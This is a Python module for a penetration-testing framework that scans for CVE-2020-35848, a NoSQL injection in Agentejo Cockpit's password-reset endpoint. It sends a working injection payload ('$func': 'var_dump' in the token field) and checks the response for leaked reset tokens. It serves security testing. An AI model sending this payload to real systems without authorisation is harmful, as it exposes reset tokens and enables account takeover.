#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Agentejo Cockpit prior to 0."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Agentejo Cockpit <0.12.0 - NoSQL Injection Detection',
        'description': 'Agentejo Cockpit prior to 0.12.0 is vulnerable to NoSQL Injection via the newpassword method of the Auth controller, which is responsible for displaying the user password reset form.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'nosqli', 'sqli', 'cockpit', 'injection', 'agentejo', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://swarm.ptsecurity.com/rce-cockpit-cms/',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-35848',
            'https://getcockpit.com/',
            'https://github.com/agentejo/cockpit/commit/2a385af8d80ed60d40d386ed813c1039db00c466',
            'https://github.com/agentejo/cockpit/commit/33e7199575631ba1f74cba6b16b10c820bec59af',
        ],
        'cve': 'CVE-2020-35848',
    }

    def run(self):
        path = '/auth/newpassword'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/json'}, data='{\n  "token": {\n    "$func": "var_dump"\n  }\n}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('string\\([0-9]{1,3}\\)(\\s)?"rp-([a-f0-9-]+)"',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(
                severity='critical',
                reason='Agentejo Cockpit <0.12.0 - NoSQL Injection detected',
                path=path,
            )
            return True
        return False

